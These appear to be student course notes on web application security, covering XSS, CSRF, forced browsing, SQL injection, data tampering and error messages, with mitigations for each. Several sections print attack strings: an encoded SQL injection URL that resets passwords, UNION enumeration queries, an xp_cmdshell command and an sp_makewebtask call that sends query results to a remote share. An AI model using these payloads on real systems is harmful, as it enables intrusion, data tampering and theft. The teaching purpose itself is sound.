

Topic 06 Web App Security
===




## Table of Contents

- [Topic 06 Web App Security](#topic-06-web-app-security)
  * [Table of Contents](#table-of-contents)
  * [Website Vulnerabilities](#website-vulnerabilities)
  * [Character Encoding](#character-encoding)
    + [Attack](#attack)
  * [Cross-Site Scripting (XSS)](#cross-site-scripting--xss-)
    + [XSS Example](#xss-example)
    + [Stored XSS](#stored-xss)
    + [Fixing XSS Vulnerability](#fixing-xss-vulnerability)
    + [Mitigate XSS Vuln](#mitigate-xss-vuln)
  * [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery--csrf-)
    + [Attacks](#attacks)
    + [Mitigate CSRF Vuln](#mitigate-csrf-vuln)
  * [Forced Browsing](#forced-browsing)
    + [Example](#example)
    + [Scanning Tools](#scanning-tools)
    + [Mitigate Vuln](#mitigate-vuln)
  * [Command Execution](#command-execution)
  * [SQL Injection](#sql-injection)
    + [Example](#example-1)
    + [SQL Injection Techniques](#sql-injection-techniques)
    + [Meta Information](#meta-information)
    + [Stored Procedures](#stored-procedures)
      - [MSSQL Stored Procedures](#mssql-stored-procedures)
    + [Blind SQL Injection](#blind-sql-injection)
      - [Example](#example-2)
    + [Mitigate SQL Injection Vuln](#mitigate-sql-injection-vuln)
  * [Database Login](#database-login)
    + [Fixing Vuln](#fixing-vuln)
  * [Data Tampering](#data-tampering)
    + [Form Data](#form-data)
      - [Form Data - Hidden Fields](#form-data---hidden-fields)
    + [Cookie Values](#cookie-values)
    + [Session Hijacking](#session-hijacking)
    + [Fixing Vuln](#fixing-vuln-1)
  * [Error Messages](#error-messages)
    + [Problem](#problem)
    + [Fixing Vuln](#fixing-vuln-2)
    + [Guidelines for Error Msgs](#guidelines-for-error-msgs)
  * [Full Path Disclosure](#full-path-disclosure)

Website Vulnerabilities
---
- OWASP top 10 vulns
- common vulns
    - cross site scripting
    - forceful browsing
    - param tampering
    - cookie poisoning
    - hidden field manipulation
    - sql injection
- sample vuln webapps
    - created for learning purposes
    - Eg. DVWA, webgoat, badstore

Character Encoding
---
- ASCII table
    - https://www.ascii-code.com/
    - ascii codes are in hex + % in front
- UTF-8
    - most common encoding schemes used in web
    - ea char rep by 8bits
    - values in range 0-127 rep ea ascii chars

### Attack
- atkers try to use methods to disguise atk strings
    - Eg. ASCII code %2e is .
    - possible url atk for sql injection atk
        - http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%27123%27%3b--%00
            - %27 - `'`
            - %3b - `;`
            - %20 - ` `
            - %3d - `=`
            - $00 - `null`
        - executed sql query - `select preferences from logintable where userid='bob'; update logintable set password='123';--`

Cross-Site Scripting (XSS)
---
- can occur when website take info entered by user & display in webpage w/o validating input
    - hacker enter specially crafted info that cause webpage to generate unexpected output
- relies on abi to inject content into webpage
- can be used to
    - deface website
    - redirect user to another page
    - manipulate Document Object Model
    - execute funcs
    - "poison" cookies
    - more

### XSS Example
![](https://i.imgur.com/hLl1BON.png)
![](https://i.imgur.com/ZrvNRyh.png)


### Stored XSS
- happens when atker enters specially crafted info & stored on web app
- atker's crafted input loaded when other users visit website
    - Eg. atker enter malicious input into review/comments textarea
    - other visitors visit will load malicious code

### Fixing XSS Vulnerability
- look for codes that takes input directly from user & post back into webpage
- perform data sanitisation
    - Eg. encode "<" with &gt
- advanced XSS can escape simple encoding checks
    - use more stringent control - explicitly check for allowable chars instead

### Mitigate XSS Vuln
- most lang like ASP, JSP, PHP have funcs used to encode output for safe display in HTML
    - Eg. & becomes &amp
- https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)


Cross-Site Request Forgery (CSRF)
---
- user logged in to website successfully & browse site
    - user has multiple tabs open
    - if encounter site with CSRF, browser may send unwanted requests to authenticated website

### Attacks
- because user alrdy authenticated/identified in website, atker can cause transactions to user's acc
- website thinks request is valid

### Mitigate CSRF Vuln
- besides auth user, website can auth request
    - send challenge token/data associated with current user session with request
    - re-auth user 
        - Eg. OTP
- users shld logoff properly
- when performing impt transactions don't open multiple windows/tabs to surf other sites


Forced Browsing
---
- web servers generally access files reachable from doc root
- CGI may allow access to files not in doc root
- atkers can craft input via browser to retrieve files not intended for him

### Example
![](https://i.imgur.com/gAX4kUQ.png)
![](https://i.imgur.com/gEqbrQW.png)

### Scanning Tools
- paros
- uniscan
- gobuster
    - scan & find dirs & other webpages

### Mitigate Vuln
- parse params if being used to access files
    - remove \ and /
- avoid common names for admin pages
    - Eg. admin/ or admin.php etc.
- restricted webpages need to check if user authenticated
- expire session vars quickly 
    - practical for your app

Command Execution
---
- poorly designed websites may allow atker to enter commands executed on web server


SQL Injection
---
- most web app interacts with db persistently to store data
    - conn to db requires login credentials to be presented during execution
    - interface to db typically through construction of sql queries

![](https://i.imgur.com/Lj0tXN1.png)
- programmers may assume user always key user & pass
- sql injection - technique whr atkers manipulate input data to execute unintended query
    - can be used to
        - update records like password
        - modify data
        - insert fake records like login credentials
        - delete records

### Example
![](https://i.imgur.com/CJCmXyr.png)

### SQL Injection Techniques
- effects of sql injection can also be to cause error
    - err msgs can reveal impt data
    - data can be used to perform further exploitation

![](https://i.imgur.com/z2EaiyN.png)

- finding table column
    - `' and pass = 'abc` can be used to guess column names
        - if pass not col, err can be like `invalid Column 'pass'`
    - use to guess other col names
- use UNION to find table names & cols
    - union is used to combine result of 2 or more select statementx
    - `' union select table_name from information_schema.tables --`
    - num of cols in union op must match
    - cycle through entire table names
    - `' union select table_name from information_schema.tables where table_name NOT in ('CHARACTER_SETS') --`
    - use same method to find table names
        - `' union select column_name from information_schema.columns where table_name = 'user' --`


### Meta Information
- most db has tables to store info abt db
    - AKA Metadata/data dict
- SQL Server & MySQL (ver 5.0)
    - SQL Standard (ISO/IEC 9075-11:2003)
    - `Information_Schema.tables`

### Stored Procedures
- most db have stored procedures
    - similar to funcs
- typical use
    - data validation
    - access control
    - batch processing

#### MSSQL Stored Procedures
- start with `'; EXEC ... -`
- `' EXEC master..xp_cmdshell 'cmd.exe /c dir c:\ > c"\dir.txt' -`
    - writes list of files & folders into `c:\dir.txt`
- `' EXEC master..sp_makewebtask "\\10.10.1.3\share\output.html", "SELECT * FROM INFORMATION_SCHEMA.TABLES"`
    - executes metadata query & sends to remote folders
- using same technique can retrieve other impt files

### Blind SQL Injection
- advanced SQL injection technique
    - doesnt respond with retrieval of data from db
    - atker can only make inference from success/failure of SQL execution
    - failure of execution will usually show diff page/general error msg

#### Example
![](https://i.imgur.com/kSX4bdv.png)


### Mitigate SQL Injection Vuln
- validate/sanitise input from users
- use prepared statements/stored procedures 
    - __not immune to injection!!__
- limit db acecss permissions
    - dont let web app access db with db admin acc
- https://www.owasp.org/index.php/Top_10-2017_A1-Injection

Database Login
---
- hard coding of login credentials in webpages not good practice
    - `dbconn = MySQLdb.connect(db="sales", user= "sa",passwd="secret",database="sales")`
- difficult to maintain
    - change of username/password needs change code
    - diff sites/envs (testing, staging etc.) needs diff credentials
- leaking of credentials through viewing of source code


### Fixing Vuln
- store encrypted login credential in txt file
- use __hardware security module (HSM)__ for decryption
    - AKA crypto box
    - keys kept within cryptobox
- limit acc privilege
    - only accessible to db
    - disallow access to metadata
- restrict clients who can access db server


Data Tampering
---
- lot of info carried by HTTP msgs
    - cookie values
    - form data
    - query string
    - HTTP headers
- undesirable effects may occur when any of these info tampered

### Form Data
- form data passed to webserver through GET/POST methods
- most devs use client-side validation like JS
- validation can be bypassed easily through direct manipulation of form data

#### Form Data - Hidden Fields
- hidden fields used in certain apps to maintain state/preserve info abt transaction
    - not rly hidden

![](https://i.imgur.com/PmUmTik.png)

### Cookie Values
- common way to store user info
    - essentially txt file stored locally
- can be tricked to write cookies of another domain
    - Eg. using XSS

### Session Hijacking
- exploits XSS vuln in app
- victim logs into system
- XSS page sends session ID to atker (website)
- atker logs in to system & replaces his session ID with victim

### Fixing Vuln
- dont trust user input
- cookie shouldnt be used entirely for auth
- use HTTP_REFERER to check for page origin
- use USER_AGENT to check user's web browser
    - Eg. if user logged in using edge, dont trust request using firefox (ask for passwd)
- HTTPS/other forms of encryption can be used to protect session cookie transmission


Error Messages
---
- app needs to respond to error
- some errors made by users & corrected by users
    - app needs to inform users abt err
    - err msgs need to be informative
- some errors system related
    - err msgs not meant for users

### Problem
- app often reveals too much info
    - default config of web server
    - Eg. ODBC showing err in SQL statement
        - attractive for SQL injection

![](https://i.imgur.com/p1mTftA.png)
![](https://i.imgur.com/dyDRSZY.png)
![](https://i.imgur.com/7DV9YSD.png)

### Fixing Vuln
- app codes
    - functional codes
    - err handling codes
- start looking at err strings
    - make sure dont reveal too much info
- extensive testing of err handling
    - most people do functional test & ignore error handling

### Guidelines for Error Msgs
- does user have minimal info he needs for corrective action
    - Eg. caps is on
- does msg provide more info abt system than is avail from other legit sources?
    - Eg. show path of config file
- is ea piece of info disclosed helpful to legit user?
    - Eg. ODBC err msgs not needed to end user
- does corrective advice in err msg indirectly disclose sensitive info?
    - Eg. failed login err msg telling user max password length is 8

Full Path Disclosure
---
- webpages normally located in dir on webserver - __webroot__
- full path disclosure - allow atker to see full path of webpage
    - Eg. `C:\inetpub\wwwroot\index.html`
- atkers can use this info to try to steal other data









###### tags: `EHD` `DISM` `School` `Notes`